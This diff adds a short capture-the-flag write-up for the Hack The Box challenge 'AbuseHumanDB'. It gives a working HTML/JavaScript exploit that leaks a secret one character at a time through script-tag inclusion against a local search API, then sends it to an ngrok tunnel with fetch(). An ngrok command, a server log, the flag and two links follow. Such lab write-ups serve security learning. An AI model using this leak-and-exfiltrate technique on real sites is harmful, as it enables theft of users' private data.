@@ -1,0 +1,50 @@
+access: http://144.126.206.249:30857/
+let's create index.html:
+<html>
+<script>
+    var local_ip = '127.0.0.1:1337'
+    // 144.126.206.249:30857
+    // var local_ip = '144.126.206.249:30857'
+    var url = `http://${local_ip}/api/entries/search?q=`;
+    var ngrok = '543c-101-128-114-68.ngrok-free.app';
+    var flag = 'HTB{5w33t_ali3ndr3n_0f_min3!_';
+    var char_list = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789(){}_:~#?&=';
+
+    async function getChunk(char){
+        return new Promise((resolve, reject) => {
+            const script = document.createElement("script");
+            script.src = url + encodeURIComponent(flag + char);
+            script.onload = () => char==='}' ? reject(char):resolve(char);
+            script.onerror = () => reject(char);
+            document.head.appendChild(script);
+        });
+    }
+
+    async function getFlag(chars){
+        var a = false;
+        for(var i = 0; i < chars.length; i++){
+            await getChunk(chars[i]).then((res) => {flag = flag.concat(res); a = res === 'x' ? true: false; i=0}, (res) => {});
+            if(a) break;
+        }
+        fetch(`http://${ngrok}/flag=${flag}`, {method:'get', mode:'cors'})
+    }
+
+    getFlag(char_list);
+</script>
+</html>
+
+let's ngrok http
+command:  ngrok http --scheme=http 80 --host-header=localhost:80
+adjusting var ngrok = ""
+
+put on abusive content url input field:
+
+result:
+GET /flag=HTB{5w33t_ali3ndr3n_0f_min3!_ 404 File not found                                             
+GET /                                   200 OK
+
+flag: HTB{5w33t_ali3ndr3n_0f_min3!}
+
+resource:
+https://luchoane.medium.com/abusehumandb-hackthebox-write-up-bc0df5eef2ec
+https://skelter.hashnode.dev/htb-abusehumandb-writeup
